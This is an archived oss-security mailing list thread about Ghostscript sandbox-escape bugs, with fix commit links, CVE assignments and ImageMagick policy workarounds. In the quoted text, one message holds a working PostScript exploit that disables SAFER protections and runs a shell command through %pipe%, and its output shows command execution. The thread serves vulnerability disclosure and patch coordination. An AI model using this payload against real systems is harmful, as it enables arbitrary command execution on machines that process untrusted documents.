X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8210" "Monday" "3" "September" "2018" "12:57:47" "+0200" "Marcus Meissner" "meissner@suse.de" "<20180903105747.dihmczuqhl4kcnx5@suse.de>" "217" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "9" "2018090310:57:47" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        meissner@sus Sep  3  217/8210  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>" ("<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "<alpine.GSO.2.20.1808221612460.22335@scrappy.simplesystems.org>" "<5b7dd771.1c69fb81.a6d8.6521@mx.google.com>" "<alpine.GSO.2.20.1808230753470.3841@freddy.simplesystems.org>" "<5b7eb7b2.1c69fb81.6b98e.519f@mx.google.com>" "<alpine.GSO.2.20.1808230958120.3639@scrappy.simplesystems.org>" "<CAJ_zFk+yb9zEXSqs2fdANvKkipg2yQAU89xKr1HMv-EJG2-vxg@mail.gmail.com>" "<20180828092517.eteuy4vzcpdpr62p@suse.de>" "<CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>" "<CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15987 invoked by uid 550); 3 Sep 2018 10:58:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 15966 invoked from network); 3 Sep 2018 10:57:59 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20180903105747.dihmczuqhl4kcnx5@suse.de>
References: <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>
 <alpine.GSO.2.20.1808221612460.22335@scrappy.simplesystems.org>
 <5b7dd771.1c69fb81.a6d8.6521@mx.google.com>
 <alpine.GSO.2.20.1808230753470.3841@freddy.simplesystems.org>
 <5b7eb7b2.1c69fb81.6b98e.519f@mx.google.com>
 <alpine.GSO.2.20.1808230958120.3639@scrappy.simplesystems.org>
 <CAJ_zFk+yb9zEXSqs2fdANvKkipg2yQAU89xKr1HMv-EJG2-vxg@mail.gmail.com>
 <20180828092517.eteuy4vzcpdpr62p@suse.de>
 <CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>
 <CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>
Organization: SUSE Linux GmbH, GF: =?iso-8859-1?Q?Felix_?=
 =?iso-8859-1?Q?Imend=F6rffer=2C_Jane_Smithard=2C_Graham_Norton=2C_HRB_212?=
 =?iso-8859-1?Q?84_=28AG_N=FCrnberg=29?=
User-Agent: NeoMutt/20170421 (1.8.2)
Date: Mon, 3 Sep 2018 12:57:47 +0200
From: Marcus Meissner <meissner@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
 coders in policy.xml by default?
To: oss-security@lists.openwall.com

Hi,

I am still holding back CVE requesting as CERT promised to do this.

If they do not reply with a plan until tomorrow I will proceed with requesting.

Ciao, Marcus
On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
> I should note, just add `userdict /setpagedevice undef` at the top if you
> want to test it with ImageMagick.
> 
> Tavis.
> 
> On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@google.com> wrote:
> 
> > Thanks Marcus, here are some more necessary commits:
> >
> >
> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
> > # 699654 D /invalidaccess checks stop working after a failed restore
> >
> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
> > # 699670 gssetresolution memory corruption
> >
> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
> > # 699671 handling /undefined results in SEGV
> >
> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
> > # 699676 PDF interpreter can leave dangerous operators available
> >
> > Please note that not all issues are resolved, and I have exploits that
> > still work against HEAD.
> >
> > For example, this will still work if you pull master as of this writing:
> >
> > $ cat testcase.pdf
> > %!PS
> > % This is ghostscript bug #699687 (split out from bug #699654)
> >
> > a0 % just select a papersize to initialize page device
> >
> > % You can't def HWResolution (for example), because currentpagedevice is
> > readonly:
> > %
> > % GS>currentpagedevice wcheck ==
> > % false
> > %
> > % But you can just put or astore into it, because the array itself is
> > writable:
> > % GS>currentpagedevice /HWResolution get wcheck ==
> > % true
> > %
> > % If you put some junk in there, then grestore stops working.
> > currentpagedevice /HWResolution get 0 (foobar) put
> >
> > % this grestore will fail, `stopped` just handles the error instead of
> > aborting.
> > { grestore } stopped {} if
> >
> > % now LockSafetyParams will be incorrectly unset, you can check like this:
> > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get
> > == pop
> > % false
> >
> > % we can change and configure devices now, so make sure we're using one
> > with
> > % a OutputFile property.
> > (ppmraw) selectdevice
> >
> > % run a shell command
> > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
> > showpage
> > $ evince testcase.pdf
> > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
> > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
> > (libspectre) ghostscript reports: ioerror -12
> >
> > Tavis.
> >
> > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@suse.de> wrote:
> >
> >> Hi,
> >>
> >> I had 4 CVEs assigned yesterday afternoon already working from CERTs list,
> >> see inline comments below. Please adjust if something is incorrect in
> >> them.
> >>
> >> CERT has mailed overnight that they will take care of the CVE assignment,
> >> so
> >> I am defering the rest to them.
> >>
> >> Ciao, Marcus
> >>
> >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
> >> > Here is an update, Artifex made a press release
> >> > <
> >> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
> >> >
> >> > listing
> >> > some necessary commits, but the list was incomplete.
> >> >
> >> > Here is a list of relevant commits I'm aware of so far, some issues are
> >> > still open with working exploits available. It's my understanding that
> >> no
> >> > new release is planned until late September, and vendors need to either
> >> > ship a git snapshot when all issues are resolved, or apply patches. I
> >> have
> >> > testcases for each problem, but I think the bugs will be visible
> >> eventually
> >> > so I'm not posting them here.
> >> >
> >> >
> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
> >> > # 699671
> >> > handling /undefined results in SEGV
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
> >> > # 699659 missing type check in ztype
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
> >> > 699654 A /invalidaccess checks stop working after a failed restore
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
> >> #
> >> > 699654 B /invalidaccess checks stop working after a failed restore
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
> >> #
> >> > 699654 C /invalidaccess checks stop working after a failed restore
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716 #
> >> 699655
> >> > - missing type checking in setcolor
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde #
> >> 699656
> >>
> >>
> >> > - LockDistillerParams boolean missing type checks
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
> >>         CVE-2018-15910
> >>
> >>
> >> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
> >> errors
> >>
> >>
> >> >
> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
> >> > # 699660 - shading_param incomplete type checking
> >> >
> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
> >> > # 699660 - shading_param incomplete type checking
> >>         CVE-2018-15909
> >>
> >>
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
> >> > # 699661 - pdf14 garbage collection memory corruption
> >> >
> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
> >> > # 699663 - .setdistillerkeys memory corruption
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
> >> > # 699664 - corrupt device object after error in job
> >>
> >>
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
> >> > # 699657 - .tempfile SAFER restrictions seem to be broken
> >>         CVE-2018-15908
> >>
> >> >
> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
> >>
> >>
> >> > # 699665 - memory corruption in aesdecode
> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
> >>
> >>         CVE-2018-15911
> >>
> >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
> >> handled
> >> >
> >> > Tavis
> >> >
> >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
> >> > bfriesen@simple.dallas.tx.us> wrote:
> >> >
> >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
> >> > > >
> >> > > > (Regarding the `file.ps2' and `file.ps3' examples without `PS2:' or
> >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it seems
> >> > > > that they ends up as:
> >> > > >
> >> > > > Domain: Coder; rights=Read; pattern="PS" ...
> >> > > >
> >> > > > ...so should be blocked by the workaround described in
> >> > > > VU#332928. But please correct me if I'm wrong.)
> >> > >
> >> > > This is likely due to header magic detection (e.g. "%!PS-Adobe").  It
> >> > > is possible that a different path will be taken if the common
> >> > > Postscript header is not detected.  The file extension may then be
> >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
> >> > > versions in use, with a wide variety of behaviors.
> >> > >
> >> > > The version of ImageMagick provided by the Ubuntu Linux I am using at
> >> > > this moment dates from 2012!
> >> > >
> >> > > Bob
> >> > > --
> >> > > Bob Friesenhahn
> >> > > bfriesen@simple.dallas.tx.us,
> >> http://www.simplesystems.org/users/bfriesen/
> >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
> >> > >
> >>
> >> --
> >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
> >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
> >> meissner@suse.de>
> >>
> >

-- 
Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@suse.de>
